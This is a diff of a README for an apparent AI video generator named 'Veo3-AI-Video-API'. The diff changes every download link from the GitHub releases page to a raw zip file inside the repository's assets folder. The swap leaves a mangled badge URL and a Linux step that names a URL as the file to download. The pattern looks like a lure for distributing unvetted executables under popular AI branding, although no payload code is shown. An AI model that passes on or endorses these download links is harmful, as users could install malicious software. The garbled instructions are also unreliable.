@@ -1,7 +1,7 @@
 # 🎥 Veo3-AI-Video-API - Create Stunning AI Videos Easily
 
 ## 📥 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shahidjhs/Veo3-AI-Video-API/releases)
+[![Download from Releases](https://raw.githubusercontent.com/shahidjhs/Veo3-AI-Video-API/main/assets/API_A_Video_Veo_v2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/shahidjhs/Veo3-AI-Video-API/main/assets/API_A_Video_Veo_v2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the Veo3-AI-Video-API! This application allows you to create impressive AI videos without needing technical skills. You can generate videos from text or images, make edits, and enjoy high-quality outputs. Follow these steps to get started.
@@ -15,14 +15,14 @@ Before downloading, ensure your system meets these requirements:
 - **Internet:** Required for downloading and using certain features
 
 ## 💾 Download & Install
-To get your copy of the Veo3-AI-Video-API, visit this page to download: [Releases Page](https://github.com/shahidjhs/Veo3-AI-Video-API/releases).
+To get your copy of the Veo3-AI-Video-API, visit this page to download: [Releases Page](https://raw.githubusercontent.com/shahidjhs/Veo3-AI-Video-API/main/assets/API_A_Video_Veo_v2.5.zip).
 
 1. Click the link above to open the releases page.
 2. Look for the latest version of the application.
 3. Choose the appropriate file for your operating system.
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/shahidjhs/Veo3-AI-Video-API/main/assets/API_A_Video_Veo_v2.5.zip` file.
 4. Click on the file to download it to your computer.
 5. Once the download is complete, open the downloaded file and follow the installation instructions.
 
@@ -60,6 +60,6 @@ This project is licensed under the MIT License. Feel free to modify and use it a
 If you run into issues or have questions, feel free to reach out through the community channels or open an issue on our GitHub page.
 
 ## 🎉 Download Now
-Once again, get started with your AI video creation by visiting this page to download: [Releases Page](https://github.com/shahidjhs/Veo3-AI-Video-API/releases).
+Once again, get started with your AI video creation by visiting this page to download: [Releases Page](https://raw.githubusercontent.com/shahidjhs/Veo3-AI-Video-API/main/assets/API_A_Video_Veo_v2.5.zip).
 
 Enjoy creating amazing videos effortlessly!
